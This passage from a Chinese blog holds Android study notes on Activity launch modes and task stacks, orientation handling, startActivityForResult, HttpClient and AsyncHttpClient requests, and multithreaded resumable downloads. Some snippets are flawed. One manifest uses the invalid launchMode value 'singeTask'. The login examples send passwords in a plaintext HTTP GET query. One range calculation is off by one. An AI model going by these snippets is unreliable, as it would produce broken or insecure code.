<li>opRestart()  </li>
<li>在onPause(),onStop()时进程被杀死了,下面不会执行</li>
</ul>
<hr>
<p>#Activity的四种启动模式</p>
<p>##任务栈</p>
<ul>
<li>什么是任务栈？<ul>
<li>记录当前用户操作的行为的一种数据结构.(后进先出的数据结构）</li>
<li>最近打开的界面，先被关闭。</li>
<li>参考发送邮件的步骤 理解任务栈的概念。</li>
<li>每个应用会有一个Activity任务栈，存放已启动的Activity。一个应用程序默认是只有一个任务栈，特殊情况下singleinstance会有多个任务栈</li>
</ul>
</li>
</ul>
<p>##进程<br>android系统 ，应用程序退出和进程退出是两个不同的概念。<br>android系统为了让应用程序可以被快速的开启。所有的应用程序退出后，进程是不会退出的。’<br>只有系统的内存空间严重不足的时候，才会把进程给回收。<br>点击图标–&gt;linux创建进程–&gt;dalvik虚拟机–&gt;读取清单文件，加载activity。<br>android理解应用程序退出： 任务栈清空了。</p>
<p>##线程<br>进程是操作系统分配内存空间的单位，每个进程的内存空间都是独立的。<br>线程是运行在进程里面。线程cpu执行的最小单位。如果进程挂了，线程也挂了。</p>
<p>##应用程序 application<br>android应用程序每个应用程序都是运行在自己的sandbox（沙箱）。<br>理解成一组activity，service，content priovder broadcastreceiver的组合。</p>
<p>##Activity的四种启动模式，修改任务栈的排列情况</p>
<ul>
<li><p>1、standard 标准启动模式。一个activity默认就是标准的启动模式。</p>
<ul>
<li>开启新的activity(可以开启自身)，activity就会被创建出来，加入到任务栈的栈顶。<br>适用于绝大多数的应用场景。</li>
<li>不用在清单中进行配置</li>
</ul>
</li>
<li><p>2、singleTop 单一顶部启动模式。 </p>
<ul>
<li>如果任务栈的栈顶存在这个要开启的activity，不会重新的创建activity，而是复用已经存在的activity。保证栈顶如果存在，不会重复创建。</li>
<li>在同一个任务栈里面可以有多个实例存在。</li>
<li>应用场景：浏览器的书签(浏览器添加到书签)singletop</li>
<li><p>清单配置</p>
<pre><code>&lt;activity 
    android:launchMode=&quot;singleTop&quot;
    android:name=&quot;.SecondActivity&quot;&gt;
&lt;/activity&gt;
</code></pre></li>
</ul>
</li>
<li><p>3、singeTask 单一任务栈启动模式。，在当前任务栈里面只能有一个实例存在。</p>
<ul>
<li>当开启activity的时候，就去检查在任务栈里面是否有实例已经存在，如果有实例存在就复用这个已经存在的activity，并且把这个activity上面的所有的别的activity都清空，复用这个已经存在的activity。</li>
<li>保证整个任务栈里面只有一个实例存在</li>
<li>应用场景：浏览器的activity</li>
<li><p>清单配置</p>
<pre><code>&lt;activity 
    android:launchMode=&quot;singeTask&quot;
    android:name=&quot;.SecondActivity&quot;&gt;
&lt;/activity&gt;
</code></pre></li>
<li><p>如果一个activity的创建需要占用大量的系统资源（cpu，内存）一般配置这个activity为singletask的启动模式。webkit内核 c代码</p>
<p>在什么时候使用singletask模式。<br>BrowserActivity 浏览器 开销(内存占用，cpu占用)非常大，singletask。保证在一个任务栈里面只有一个实例存在。<br>webkit 内核 页面。<br>很多东西需要初始化<br>html解析器<br>html渲染器<br>css 渲染器<br>javascript 执行引擎     </p>
<blockquote>
<p>如果一个activity的资源开销非常大，建议使用singletask的启动模式。<br>浏览器的activity使用的就是singletask的启动模式。</p>
</blockquote>
</li>
</ul>
</li>
<li><p>4、singleInstance 单一实例启动模式。非常特殊， activity会运行在自己的任务栈里面，并且这个任务栈里面只有一个实例存在</p>
<ul>
<li>类似于java中的单例模式，单态模式。在整个android手机操作系统里面只有一个activity的实例存在。</li>
<li>singleinstance启动模式的activity会运行在自己<strong><em>单独</em></strong>的任务栈里面</li>
<li>如果你要保证一个activity在整个手机操作系统里面只有一个实例存在，使用singleInstance</li>
<li>应用场景： 电话拨打界面</li>
<li>InCallScreen 通话的activity配置模式是singleinstance的。在整个手机操作系统里面只有他一个实例存在。</li>
<li><p>清单配置</p>
<pre><code>&lt;activity 
    android:launchMode=&quot;singleInstance&quot;
    android:name=&quot;.SecondActivity&quot;&gt;
&lt;/activity&gt;
</code></pre></li>
</ul>
</li>
</ul>
<p>##任务栈的细节</p>
<ul>
<li>每个应用程序运行，系统都会分配一个新的任务栈。</li>
<li>问题：问系统里面有多少个任务栈存在？</li>
<li>有多少个应用程序正在运行（activity没有都被销y毁，回桌面），就有几个任务栈。<br>应该是就至少有几个</li>
<li><p>如果一个应用里面有一个singleinstance呢???</p>
</li>
<li><p>任务栈的id是一个int类型的整数，自增长的id。不关机的话由getTaskId()得到的进程id会不断增加</p>
</li>
<li>一启动,会给launcher,systemui两个任务栈</li>
<li>当只启动后台服务,没有启动画面,是不会分配任务栈的</li>
</ul>
<hr>
<p>##横竖屏切换的生命周期</p>
<ul>
<li>默认情况下 ，横竖屏切换， 销毁当前的activity，重新创建一个新的activity</li>
<li><p>快捷键ctrl+F11</p>
</li>
<li><p>在一些特殊的应用程序常见下，比如游戏，不希望横竖屏切换activity被销毁重新创建</p>
</li>
<li>需求：禁用掉横竖屏切换的生命周期</li>
<li><p>横竖屏写死</p>
<pre><code>android:screenOrientation=&quot;landscape&quot; 横屏
android:screenOrientation=&quot;portrait&quot; 竖屏
</code></pre></li>
<li><p>让系统的环境 不再去敏感横竖屏的切换。</p>
<pre><code>android:configChanges=&quot;orientation|screenSize|keyboardHidden&quot;
</code></pre></li>
<li><p>写死横竖屏示例：</p>
<pre><code>&lt;activity
    android:screenOrientation=&quot;portrait&quot;
    android:configChanges=&quot;orientation|screenSize|keyboardHidden&quot;
    android:name=&quot;com.itheima.lifecycle.MainActivity&quot;
    &gt;
    &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;

        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
    &lt;/intent-filter&gt;
&lt;/activity&gt;    
</code></pre></li>
</ul>
<hr>
<p>#掌握开启activity获取返回值</p>
<p>###从A界面打开B界面， B界面关闭的时候，返回一个数据给A界面<br>步骤：</p>
<ul>
<li><p>1, 用新方法startActivityForResult(intent, 0)替代startActivity(intent)去<br>启动目标activity并且获取返回值，</p>
<ul>
<li>在主页面用这个方法启动的目标Activity，当目标Activity销毁时，会触发主页面onActivityResult方法</li>
<li><p>startActivityForResult()方法：</p>
<ul>
<li>参数1：意图（启动新界面） </li>
<li>参数2：请求码（用来在触发启动onActivityResult方法时，做匹配用）</li>
</ul>
<p>startActivityForResult(intent, 0);</p>
<p>public void click1(View v){<br>  Intent intent = new Intent(this, ContactActivity.class);<br>  //startActivity(intent);</p>
<p>  //用这个方法启动的Activity，当销毁时，会触发onActivityResult方法<br>  startActivityForResult(intent, 10);<br>}</p>
</li>
</ul>
</li>
<li><p>2.在新开启的界面里面实现设置数据的逻辑</p>
<ul>
<li><p>setResult()方法</p>
<ul>
<li>参数1：结果码 返回给父页面，做匹配用</li>
<li><p>参数2：要返回的数据，放在意图中</p>
<p>Intent data = new Intent();<br>data.putExtra(“phone”, phone);<br>//设置一个结果数据，数据会返回给调用者<br>setResult(0, data);<br>finish();//关闭掉当前的activity，才会返回数据</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>-示例–当点击目标Activity中的ListView中任何一条目，触发设置数据的逻辑，销毁目标Activity</p>
<pre><code>    public class ContactActivity extends Activity {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_contact);

            final String[] names = new String[]{
                &quot;白九日&quot;,
                &quot;莎九日&quot;,
                &quot;包九日&quot;,
            };

            ListView lv = (ListView) findViewById(R.id.lv);
            lv.setAdapter(new ArrayAdapter&lt;String&gt;(this, R.layout.item_listview, 
                    R.id.tv_name, names));

            //给listview的条目设置点击侦听
            lv.setOnItemClickListener(new OnItemClickListener() {

                @Override
                public void onItemClick(AdapterView&lt;?&gt; parent, View view,
                        int position, long id) {
                    Intent data = new Intent();
                    data.putExtra(&quot;name&quot;, names[position]);

                    //当此Activity销毁时，data就会被传递给上一个Activity
                    setResult(100, data);
                    //销毁当前Activity
                    finish();
                }
            });
        }

}
</code></pre><p>-示例2–</p>
<pre><code>public class MyActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        //指定Activity显示哪一个布局文件
        setContentView(R.layout.activity_my);
        //
        final TextView tv_wife_name = (TextView) findViewById(R.id.tv_wife_name);
        final TextView tv_wife_action = (TextView) findViewById(R.id.tv_wife_action);

        tv_wife_name.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                Intent data = new Intent();
                data.putExtra(&quot;name&quot;, tv_wife_name.getText());
                setResult(300, data);
                finish();
            }
        });

        tv_wife_action.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                Intent data = new Intent();
                data.putExtra(&quot;body&quot;, tv_wife_action.getText());
                setResult(400, data);
                finish();
            }
        });
    }
}
</code></pre><ul>
<li>3.在开启者activity里面实现方法（在主界面实现onActivityResult）</li>
<li><p>onActivityResult()方法：</p>
<ul>
<li>参数1：requestCode 请求码 区分请求来自于哪个按钮。    </li>
<li>参数2：resultCode  结果码 区分请求来自于哪个结果。</li>
<li><p>参数3：data参数就是返回的结果数据。从里面把数据取出来。 </p>
<pre><code>onActivityResult(int requestCode, int resultCode, Intent data) 
</code></pre><p>  通过data获取返回的数据</p>
</li>
</ul>
</li>
</ul>
<hr>
<pre><code>@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    //通过请求码来判断数据来自哪个Activity
    if(requestCode == 10){

        String name = data.getStringExtra(&quot;name&quot;);
        EditText et = (EditText) findViewById(R.id.et_name);
        et.setText(name);
    }
    else if(requestCode == 20){

        String name = data.getStringExtra(&quot;sms&quot;);
        EditText et = (EditText) findViewById(R.id.et_body);
        et.setText(name);
    }
    else if(requestCode == 30){
        //通过结果码判断数据属于什么类型
        if(resultCode == 300){
            String name = data.getStringExtra(&quot;name&quot;);
            EditText et = (EditText) findViewById(R.id.et_name);
            et.setText(name);
        }
        else if(resultCode == 400){
            String name = data.getStringExtra(&quot;body&quot;);
            EditText et = (EditText) findViewById(R.id.et_body);
            et.setText(name);
        }
    }
}
</code></pre><ul>
<li>4.根据请求码和结果码确定业务逻辑</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/05-多线程断点续传下载/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/05-多线程断点续传下载/" itemprop="url">
                  05 多线程断点续传下载
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:44:28+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#一、HttpClient</p>
<p>###1.1 发送get请求</p>
<ul>
<li><p>创建一个客户端对象</p>
<p>  HttpClient client = new DefaultHttpClient();</p>
</li>
<li><p>创建一个get请求对象</p>
<p>  HttpGet hg = new HttpGet(path);</p>
</li>
<li><p>发送get请求，建立连接，返回响应头对象</p>
<p>  HttpResponse hr = hc.execute(hg);</p>
</li>
<li><p>获取状态行对象，获取状态码，如果为200则说明请求成功</p>
<pre><code>if(hr.getStatusLine().getStatusCode() == 200){
    //拿到服务器返回的输入流
    InputStream is = hr.getEntity().getContent();
    String text = Utils.getTextFromStream(is);
}
</code></pre></li>
<li><p>HttpClient框架GET提交用户名密码示例</p>
<pre><code>//点击事件：HttpClient框架GET提交用户名密码
public void click1(View v){
    //获取用户输入的用户名密码
    String name = et_name.getText().toString();
    String pass = et_pass.getText().toString();

//设置提交网址,需要拼接字符串         URLEncoder.encode(name) 此代码将中文进行URL编码，转成二进制(因为地址栏中，纯中文提交参数，接收后会显示乱码,注意接收参数时使用iso-8859-1解码)

    final String address = &quot;http://192.168.15.35:8080/Android_login/userLogin?name=&quot;+URLEncoder.encode(name)+&quot;&amp;pwd=&quot;+pass;

    //子线程中，使用HttpClient框架GET方式提交数据
    Thread t = new Thread(){
        @Override
        public void run() {
            //1.创建httpclient对象
            HttpClient client = new DefaultHttpClient();
            //2.创建get请求对象
            HttpGet get = new HttpGet(address);
            try {

                //3.使用客户端发送get请求，拿到服务器返回的信息
                HttpResponse response = client.execute(get);
                //获取响应状态行
                StatusLine sl =response.getStatusLine();
                //获取响应状态码，进行判断
                if (sl.getStatusCode()==200) {
                    //获取响应头输入流实例HttpEntity
                    HttpEntity entity = response.getEntity();
                    //获取流里的数据(字符串)
                    InputStream is = entity.getContent();
                    //将流里的数据转换成字符串
                    String text = Tools.getTextFromStream(is);
                    //4发送消息到消息队列，携带流数据，主界面刷新UI
                    Message message = handler.obtainMessage();
                    message.obj=text;
                    message.what=0;
                    handler.sendMessage(message);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
    t.start();
}
</code></pre></li>
</ul>
<p>###1.2 发送post请求</p>
<pre><code>//创建一个客户端对象
HttpClient client = new DefaultHttpClient();
//创建一个post请求对象
HttpPost hp = new HttpPost(path);
</code></pre><ul>
<li><p>往post对象里放入要提交给服务器的数据</p>
<pre><code>//要提交的数据以键值对的形式存在BasicNameValuePair对象中
List&lt;NameValuePair&gt; parameters = new ArrayList&lt;NameValuePair&gt;();
BasicNameValuePair bnvp = new BasicNameValuePair(&quot;name&quot;, name);
BasicNameValuePair bnvp2 = new BasicNameValuePair(&quot;pass&quot;, pass);
parameters.add(bnvp);
parameters.add(bnvp2);
//创建实体对象，指定进行URL编码的码表
UrlEncodedFormEntity entity = new UrlEncodedFormEntity(parameters, &quot;utf-8&quot;);
//为post请求设置实体
hp.setEntity(entity);
</code></pre></li>
<li><p>HttpClient框架POST提交用户名密码示例</p>
<pre><code>//点击事件：HttpClient框架POST提交用户名密码
public void click2(View v){
    //获取用户输入的用户名密码
    final String name = et_name.getText().toString();
    final String pass = et_pass.getText().toString();

    //设置提交网址,不需要拼接字符串
    final String address = &quot;http://192.168.15.35:8080/Android_login/userLogin&quot;;

    //子线程中，使用HttpClient框架POST方式提交数据
    Thread t = new Thread(){
        @Override
        public void run() {
            //1.创建httpclient对象
            HttpClient client = new DefaultHttpClient();
            //2.创建post请求对象
            HttpPost post = new HttpPost(address);

            //把要提交的数据封装至post对象中
            //把要提交的数据存放至list中
            List&lt;NameValuePair&gt;  parameters = new ArrayList&lt;NameValuePair&gt;();
            NameValuePair nvp1 = new BasicNameValuePair(&quot;name&quot;, name);
            NameValuePair nvp2 = new BasicNameValuePair(&quot;pwd&quot;, pass);
            parameters.add(nvp1);
            parameters.add(nvp2);
            try {
                //创建实体对象，指定进行URL编码的码表
                HttpEntity entity = new UrlEncodedFormEntity(parameters,&quot;UTF-8&quot;);
                //把数据设置到请求头的流中 //为post请求设置实体
                post.setEntity(entity);
                //3.使用客户端发送post请求，拿到服务器返回的信息
                HttpResponse response = client.execute(post);
                //获取响应状态行
                StatusLine sl = response.getStatusLine();
                //获取响应状态码，进行判断
                if (sl.getStatusCode()==200) {

                    //获取响应头输入流实例HttpEntity
                    HttpEntity entity1 = response.getEntity();
                    //获取流里的数据(字符串)
                    InputStream is = entity1.getContent();
                    //将流里的数据转换成字符串
                    String text = Tools.getTextFromStream(is);
                    //4发送消息到消息队列，携带流数据，主界面刷新UI
                    Message message = handler.obtainMessage();
                    message.obj=text;
                    message.what=0;
                    handler.sendMessage(message);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
    t.start();
}
</code></pre><p>#二、异步HttpClient框架<br>###2.1 发送get请求</p>
<pre><code>//创建异步的httpclient对象
AsyncHttpClient ahc = new AsyncHttpClient();
//发送get请求
ahc.get(path, new MyHandler());
</code></pre></li>
<li><p>注意AsyncHttpResponseHandler两个方法的调用时机</p>
<p>   class MyHandler extends AsyncHttpResponseHandler{</p>
<pre><code>    //http请求成功，返回码为200，系统回调此方法
    @Override
    public void onSuccess(int statusCode, Header[] headers,
            //responseBody的内容就是服务器返回的数据
            byte[] responseBody) {
        Toast.makeText(MainActivity.this, new String(responseBody), 0).show();

    }

    //http请求失败，返回码不为200，系统回调此方法
    @Override
    public void onFailure(int statusCode, Header[] headers,
            byte[] responseBody, Throwable error) {
        Toast.makeText(MainActivity.this, &quot;返回码不为200&quot;, 0).show();

    }
}
</code></pre></li>
</ul>
<ul>
<li>异步HttpClient框架发送get请求示例</li>
</ul>
<pre><code>public class MainActivity extends Activity {

     //查找控件
     EditText et_name ;
     EditText et_pass ;

     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         //显示当前页面布局文件
         setContentView(R.layout.activity_main);
         //初始化控件
         et_name = (EditText) findViewById(R.id.et_name);
         et_pass = (EditText) findViewById(R.id.et_pass);
     }

     //点击事件：异步HttpClient框架get提交
     public void click1(View v){
         //获取用户输入的用户名密码
         String name = et_name.getText().toString();
         String pass = et_pass.getText().toString();

         //定义表单提交地址
         String address = &quot;http://192.168.15.35:8080/Android_login/userLogin&quot;;
         //创建异步HttpClient对象
         AsyncHttpClient client = new AsyncHttpClient();
         //封装请求参数，封装到框架提供的对象RequestParams
         RequestParams rp = new RequestParams();
         rp.add(&quot;name&quot;, name);//第一个&quot;name&quot; 表单中用户名name属性值，第二个name是获取到的用户输入的用户名
         rp.add(&quot;pwd&quot;, pass);//pwd是表单中密码的name属性值，pass是获取到的用户输入的密码
         //发送get请求(3个参数，1：地址;2:封装请求参数的对象;3:响应处理对象)
         client.get(address,rp,new MyResponseHandler());

     }
     //我的响应处理器类
     class MyResponseHandler extends AsyncHttpResponseHandler{

         //请求成功时此方法调用，响应码是200开头
         @Override
         public void onSuccess(int statusCode, Header[] headers,
                 byte[] responseBody) {//第三个参数：就是返回的输入流，框架将他转换成字节数组了
             String text = new String(responseBody);
             Toast.makeText(MainActivity.this, text, 0).show();

         }

         //请求失败时此方法调用
         @Override
         public void onFailure(int statusCode, Header[] headers,
                 byte[] responseBody, Throwable error) {//第三个参数：就是返回的输入流，框架将他转换成字节数组了
             String text = new String(responseBody);
             Toast.makeText(MainActivity.this, text, 0).show();
         }
     }
 }
</code></pre><p>###2.2 发送post请求</p>
<ul>
<li><p>使用RequestParams对象封装要携带的数据</p>
<pre><code>//创建异步httpclient对象
AsyncHttpClient ahc = new AsyncHttpClient();
//创建RequestParams封装要携带的数据
RequestParams rp = new RequestParams();
rp.add(&quot;name&quot;, name);
rp.add(&quot;pass&quot;, pass);
//发送post请求
ahc.post(path, rp, new MyHandler());
</code></pre></li>
</ul>
<ul>
<li>异步HttpClient框架发送post请求</li>
</ul>
<pre><code>public class MainActivity extends Activity {

     //查找控件
     EditText et_name ;
     EditText et_pass ;

     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         //显示当前页面布局文件
         setContentView(R.layout.activity_main);
         //初始化控件
         et_name = (EditText) findViewById(R.id.et_name);
         et_pass = (EditText) findViewById(R.id.et_pass);
     }
     //点击事件：异步HttpClient框架post提交
     public void click2(View v){
         //获取用户输入的用户名密码
         String name = et_name.getText().toString();
         String pass = et_pass.getText().toString();

         //定义表单提交地址
         String address = &quot;http://192.168.15.35:8080/Android_login/userLogin&quot;;
         //创建异步HttpClient对象
         AsyncHttpClient client = new AsyncHttpClient();
         //封装请求参数，封装到框架提供的对象RequestParams
         RequestParams rp = new RequestParams();
         rp.add(&quot;name&quot;, name);//第一个&quot;name&quot; 表单中用户名name属性值，第二个name是获取到的用户输入的用户名
         rp.add(&quot;pwd&quot;, pass);//pwd是表单中密码的name属性值，pass是获取到的用户输入的密码
         //发送get请求(3个参数，1：地址;2:封装请求参数的对象;3:响应处理对象)
         client.post(address,rp,new MyResponseHandler());
     }

     //自定义我的响应处理器类
     class MyResponseHandler extends AsyncHttpResponseHandler{

         //请求成功时此方法调用，响应码是200开头
         @Override
         public void onSuccess(int statusCode, Header[] headers,
                 byte[] responseBody) {//第三个参数：就是返回的输入流，框架将他转换成字节数组了
             String text = new String(responseBody);
             Toast.makeText(MainActivity.this, text, 0).show();

         }

         //请求失败时此方法调用
         @Override
         public void onFailure(int statusCode, Header[] headers,
                 byte[] responseBody, Throwable error) {//第三个参数：就是返回的输入流，框架将他转换成字节数组了
             String text = new String(responseBody);
             Toast.makeText(MainActivity.this, text, 0).show();

         }

     }
 }
</code></pre><hr>
<p>#三、多线程下载</p>
<blockquote>
<p>原理：服务器CPU分配给每条线程的时间片相同，服务器带宽平均分配给每条线程，所以客户端开启的线程越多，就能抢占到更多的服务器资源</p>
</blockquote>
<ul>
<li>单线程下载：客户端请求服务器，请求成功拿到输入流，流里就是要下载的电影，客户端只需从流的第0个字节，读取到最后一个字节，并把所有读取的字节写入文件输出流，下载就完成</li>
</ul>
<p>###3.1 确定每条线程下载多少数据</p>
<ul>
<li><p>发送http请求至下载地址</p>
<pre><code>String path = &quot;http://192.168.1.102:8080/editplus.exe&quot;;        
URL url = new URL(path);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setReadTimeout(5000);
conn.setConnectTimeout(5000);
conn.setRequestMethod(&quot;GET&quot;);                    
</code></pre></li>
<li>获取文件总长度，然后创建长度一致的临时文件</li>
<li><p>硬盘缓冲区：数据读写时，先进入缓冲区，等攒到缓冲区数据满了，再一次性写入硬盘</p>
<pre><code>if(conn.getResponseCode() == 200){
    //获得服务器流中数据的长度
    int length = conn.getContentLength();
    //创建一个临时文件存储下载的数据
    RandomAccessFile raf = new RandomAccessFile(getFileName(path), &quot;rwd&quot;);
    //设置临时文件的大小
    raf.setLength(length);
    raf.close();
</code></pre></li>
<li><p>确定线程下载多少数据</p>
<pre><code>//计算每个线程下载多少数据
int blockSize = length / THREAD_COUNT;
</code></pre><p>###3.2 计算每条线程下载数据的开始位置和结束位置</p>
<pre><code>for(int id = 1; id &lt;= 3; id++){
    //计算每个线程下载数据的开始位置和结束位置
    int startIndex = (id - 1) * blockSize;
    int endIndex = id * blockSize - 1;
    if(id == THREAD_COUNT){
        endIndex = length;
    }

    //开启线程，按照计算出来的开始结束位置开始下载数据
    new DownLoadThread(startIndex, endIndex, id).start();
}
</code></pre><p>###3.3 再次发送请求至下载地址，请求开始位置至结束位置的数据</p>
<pre><code>String path = &quot;http://192.168.1.102:8080/editplus.exe&quot;;

URL url = new URL(path);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setReadTimeout(5000);
conn.setConnectTimeout(5000);
conn.setRequestMethod(&quot;GET&quot;);

//向服务器请求部分数据
conn.setRequestProperty(&quot;Range&quot;, &quot;bytes=&quot; + startIndex + &quot;-&quot; + endIndex);
conn.connect();
</code></pre></li>
<li><p>下载请求到的数据，存放至临时文件中</p>
<pre><code>if(conn.getResponseCode() == 206){
    InputStream is = conn.getInputStream();
    RandomAccessFile raf = new RandomAccessFile(getFileName(path), &quot;rwd&quot;);
    //指定从哪个位置开始存放数据
    raf.seek(startIndex);
    byte[] b = new byte[1024];
    int len;
    while((len = is.read(b)) != -1){
        raf.write(b, 0, len);
    }
    raf.close();
}
</code></pre><p>###多线程断点续传java版示例：</p>
<p>  public class Demo {</p>
<pre><code>//定义要下载资源的网址(下载一个软件的地址)
static String address = &quot;http://192.168.15.35:8080/PowerWord.100.exe&quot;;
//定义开启的线程的个数
static int threadCount = 3;
//定义已完成下载的子线程个数
static int finishedThreadCount = 0;

public static void main(String[] args) {
    try {
        //get发送请求
        //1 封装URL
        URL url = new URL(address);
        //2 获取连接对象
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        //3 设置参数
        conn.setRequestMethod(&quot;GET&quot;);
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        //4 发送请求(可不写)

        //5 获取响应码，进行判断
        if (conn.getResponseCode()==200) {

            //拿到要下载的文件的总长度
            int length = conn.getContentLength();
            //(封装临时文件)在本地自动生成一个临时文件(若存在，则不用生成)(另外封装RandomAccessFile文件对象相当于自动获取此文件的输出流)
            //第二个参数de作用是:可以立即将读取的数据写入临时文件
            //路径是：工作空间/工程目录/
            RandomAccessFile raf = new RandomAccessFile(_getFileName(address), &quot;rwd&quot;); 

            //设置临时文件与下载文件大小一致
            raf.setLength(length);
            //关闭临时文件(就相当于关闭临时文件的输出流)
            raf.close();

            //计算每条线程要下载的长度
            int size = length/threadCount;
            //计算每条线程的开始位置与结束位置
            for (int i = 0; i &lt; threadCount; i++) {
                int startIndex = i * size;//开始位置
                int endIndex = (i+1)*size-1;//结束位置
                if (i==threadCount-1) {
                    endIndex=length-1;
                }
                //开启每一条线程
                new DownloadThread(startIndex,endIndex,i).start();
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
}
//通过网址，获取文件名
static String _getFileName(String path){
    int index = path.lastIndexOf(&quot;/&quot;);
    return path.substring(index + 1);
}
</code></pre><p>  }</p>
<p>  //自定义多线程:用于下载数据<br>  class DownloadThread extends Thread{</p>
<pre><code>//定义成员变量，某线程开始下载处的角标，结束下载处的角标，线程的id
int startIndex;
int endIndex;
int threadId;
//构造函数
public DownloadThread(int startIndex, int endIndex, int threadId) {
    super();
    this.startIndex = startIndex;
    this.endIndex = endIndex;
    this.threadId = threadId;
}

@Override
public void run() {
    //开启子线程下载目标文件
    try {
        //将每个线程记录下载进度的临时文件进行封装
        File file = new File(threadId+&quot;.txt&quot;);
        //定义每个线程下载的进度lastTotal(初始化为0)
        int lastTotal=0;
        //判断每个线程记录下载进度的临时文件是否存在
        if (file.exists()) {
            //获取输入流
            InputStream is = new FileInputStream(file);
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            //读取流数据，获取每个线程上一次的下载进度
            lastTotal = Integer.parseInt(br.readLine());
            //改变下载的开始位置，已经下载过的数据，就不要再去请求了
            startIndex += lastTotal;
            //关闭流
            is.close();
        }

        System.out.println(&quot;线程&quot; + threadId + &quot;的最终下载区间为：&quot; + startIndex + &quot;~&quot; + endIndex);

        //GET请求下载数据 封装URl 获取连接对象 设置参数
        URL url = new URL(Demo.address);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod(&quot;GET&quot;);
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        //定义请求下载的数据的范围
        conn.setRequestProperty(&quot;Range&quot;,&quot;bytes=&quot;+startIndex+&quot;-&quot;+endIndex);

        //获取响应状态码，进行判断
        if (conn.getResponseCode()==206) {

            //获取服务器返回的流，流里的数据只有startIndex到endIndex区间的数据，并不会包含目标文件所有数据
            InputStream is = conn.getInputStream();
            //定义一个字节数组，用来存储每次从流里读取的数据
            byte[] b = new byte[1024];
            //定义一个int变量，用来接收每次从流里读取数据的长度
            int len;
            //定义每个线程各自的总下载进度（初始化为lastTotal）
            int total = lastTotal;
            //(封装临时文件)每个子线程都有自己要下载的数据，在本地自动生成一个临时文件(若存在，则不用生成)(另外封装RandomAccessFile文件对象相当于自动获取此文件的输出流)
            RandomAccessFile raf = new RandomAccessFile(Demo._getFileName(Demo.address),&quot;rwd&quot;);
            //改变往raf中写入数据的开始位置
            raf.seek(startIndex);

            //开始往临时文件写数据
            //while循环写入
            while ((len=is.read(b))!=-1) {

                //记录每条线程各自写入的总进度
                total+=len;

                System.out.println(&quot;线程&quot; + threadId + &quot;已下载的字节数为:&quot; + total);

                //写入
                raf.write(b,0,len);

                //为了完成断点续传，while每次循环,都要将下载的进度，写入一个文本临时文件中
                //(封装此记录每条线程总进度的临时文件，)(另外封装RandomAccessFile文件对象相当于自动获取此文件的输出流)
                RandomAccessFile rafProgress = new RandomAccessFile(file, &quot;rwd&quot;);
                //写入线程进度
                rafProgress.write((total+&quot;&quot;).getBytes());
                //关闭临时文件(相当于关闭流)
                rafProgress.close();
            }
            System.out.println(&quot;线程&quot; + threadId + &quot;下载完毕---------------------&quot;);

            //此子线程的下载数据完成了，关闭此子线程临时文件(相当于关闭流)
            raf.close();
            //已完成下载的子线程个数+1
            Demo.finishedThreadCount++;
            //三个线程全部下载完毕，才去删除文本临时文件
            synchronized (Demo.address) {
                if (Demo.finishedThreadCount==3) {
                    for (int i = 0; i &lt; Demo.threadCount; i++) {
                        File f = new File(i+&quot;.txt&quot;);
                        if (f.exists()) {
                            f.delete();
                        }
                    }
                    Demo.finishedThreadCount=0;
                }
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
}
</code></pre><p>  }</p>
</li>
</ul>
<hr>
<p>#四、 带断点续传的多线程下载</p>
<blockquote>
<p>从上次下载结束的位置开始，继续下载</p>
</blockquote>
<ul>
<li>记录下载的当前进度，把该进度实时写入一个临时文件</li>
<li>下一次下载时，读取这个临时文件中的下载进度，也就是上一次下载的进度，从这个进度开始下载</li>
<li><p>定义一个int变量记录每条线程下载的数据总长度，然后加上该线程的下载开始位置，得到的结果就是下次下载时，该线程的开始位置，把得到的结果存入缓存文件</p>
